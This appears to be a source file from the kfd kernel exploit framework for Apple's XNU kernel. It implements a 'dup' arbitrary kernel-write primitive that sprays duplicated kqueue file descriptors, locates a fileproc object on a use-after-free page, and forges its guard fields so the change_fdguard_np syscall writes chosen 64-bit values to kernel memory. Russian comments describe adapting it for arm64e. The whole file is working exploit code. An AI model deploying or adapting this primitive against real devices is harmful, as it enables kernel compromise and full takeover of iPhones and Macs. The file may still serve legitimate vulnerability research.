/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef kwrite_dup_h
#define kwrite_dup_h

void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value);

void kwrite_dup_init(struct kfd* kfd)
{
    kfd->kwrite.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
    kfd->kwrite.krkw_object_size = sizeof(struct fileproc);

    kfd->kwrite.krkw_method_data_size = ((kfd->kwrite.krkw_maximum_id + 1) * (sizeof(i32)));
    kfd->kwrite.krkw_method_data = malloc_bzero(kfd->kwrite.krkw_method_data_size);

    i32 kqueue_fd = kqueue();
    assert(kqueue_fd > 0);

    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    fds[kfd->kwrite.krkw_maximum_id] = kqueue_fd;
}

void kwrite_dup_allocate(struct kfd* kfd, u64 id)
{
    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    i32 kqueue_fd = fds[kfd->kwrite.krkw_maximum_id];
    i32 fd = dup(kqueue_fd);
    assert(fd > 0);
    fds[id] = fd;
}

bool kwrite_dup_search(struct kfd* kfd, u64 object_uaddr)
{
    /*
     * arm64e: PUAF страницы PPL-owned — прямой volatile доступ -> SIGBUS.
     * Читаем через vm_read_overwrite в локальный буфер.
     */
    struct fileproc fp = {};
    vm_size_t out_size = 0;
    kern_return_t kr = vm_read_overwrite(
        mach_task_self(),
        (vm_address_t)object_uaddr,
        sizeof(struct fileproc),
        (vm_address_t)&fp,
        &out_size);
    if (kr != KERN_SUCCESS || out_size != sizeof(struct fileproc)) return false;

    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);

    if ((fp.fp_iocount == 1) &&
        (fp.fp_vflags == 0) &&
        (fp.fp_flags == 0) &&
        (fp.fp_guard_attrs == 0) &&
        (fp.fp_glob > PTR_MASK) &&
        (fp.fp_guard == 0)) {
        for (u64 object_id = kfd->kwrite.krkw_searched_id; object_id < kfd->kwrite.krkw_allocated_id; object_id++) {
            assert_bsd(fcntl(fds[object_id], F_SETFD, FD_CLOEXEC));

            /* Перечитываем fp_flags через vm_read_overwrite */
            struct fileproc fp2 = {};
            vm_size_t sz2 = 0;
            vm_read_overwrite(mach_task_self(),
                              (vm_address_t)object_uaddr,
                              sizeof(struct fileproc),
                              (vm_address_t)&fp2, &sz2);

            if (fp2.fp_flags == 1) {
                kfd->kwrite.krkw_object_id = object_id;
                return true;
            }

            assert_bsd(fcntl(fds[object_id], F_SETFD, 0));
        }

        print_warning("failed to find modified fp_flags sentinel");
    }

    return false;
}

void kwrite_dup_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    kwrite_from_method(u64, kwrite_dup_kwrite_u64);
}

void kwrite_dup_find_proc(struct kfd* kfd)
{
    return;
}

void kwrite_dup_deallocate(struct kfd* kfd, u64 id)
{
    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    assert_bsd(close(fds[id]));
}

void kwrite_dup_free(struct kfd* kfd)
{
    kwrite_dup_deallocate(kfd, kfd->kwrite.krkw_object_id);
    kwrite_dup_deallocate(kfd, kfd->kwrite.krkw_maximum_id);
}

/*
 * 64-bit kwrite — пишем в fp_guard_attrs и fp_guard через vm_write (arm64e safe).
 */
void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
{
    if (new_value == 0) {
        print_warning("cannot write 0");
        return;
    }

    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    i32 kwrite_fd = fds[kfd->kwrite.krkw_object_id];
    u64 fileproc_uaddr = kfd->kwrite.krkw_object_uaddr;

    const bool allow_retry = false;

    do {
        u64 old_value = 0;
        kread((u64)(kfd), kaddr, &old_value, sizeof(old_value));

        if (old_value == 0) {
            print_warning("cannot overwrite 0");
            return;
        }

        if (old_value == new_value) break;

        /* Читаем текущий fileproc */
        struct fileproc fp = {};
        vm_size_t out_size = 0;
        vm_read_overwrite(mach_task_self(),
                          (vm_address_t)fileproc_uaddr,
                          sizeof(struct fileproc),
                          (vm_address_t)&fp, &out_size);

        u16 old_fp_guard_attrs = fp.fp_guard_attrs;
        u16 new_fp_guard_attrs = GUARD_REQUIRED;
        u64 old_fp_guard = fp.fp_guard;
        u64 new_fp_guard = kaddr - offsetof(struct fileproc_guard, fpg_guard);

        /* Патчим fp_guard_attrs через vm_write */
        u64 guard_attrs_offset = offsetof(struct fileproc, fp_guard_attrs);
        vm_write(mach_task_self(),
                 (vm_address_t)(fileproc_uaddr + guard_attrs_offset),
                 (vm_offset_t)&new_fp_guard_attrs, sizeof(new_fp_guard_attrs));

        /* Патчим fp_guard через vm_write */
        u64 guard_offset = offsetof(struct fileproc, fp_guard);
        vm_write(mach_task_self(),
                 (vm_address_t)(fileproc_uaddr + guard_offset),
                 (vm_offset_t)&new_fp_guard, sizeof(new_fp_guard));

        u64 guard = old_value;
        u32 guardflags = GUARD_REQUIRED;
        u64 nguard = new_value;
        u32 nguardflags = GUARD_REQUIRED;

        if (allow_retry) {
            syscall(SYS_change_fdguard_np, kwrite_fd, &guard, guardflags, &nguard, nguardflags, NULL);
        } else {
            assert_bsd(syscall(SYS_change_fdguard_np, kwrite_fd, &guard, guardflags, &nguard, nguardflags, NULL));
        }

        /* Восстанавливаем fp_guard_attrs и fp_guard */
        vm_write(mach_task_self(),
                 (vm_address_t)(fileproc_uaddr + guard_attrs_offset),
                 (vm_offset_t)&old_fp_guard_attrs, sizeof(old_fp_guard_attrs));
        vm_write(mach_task_self(),
                 (vm_address_t)(fileproc_uaddr + guard_offset),
                 (vm_offset_t)&old_fp_guard, sizeof(old_fp_guard));
    } while (allow_retry);
}

#endif /* kwrite_dup_h */
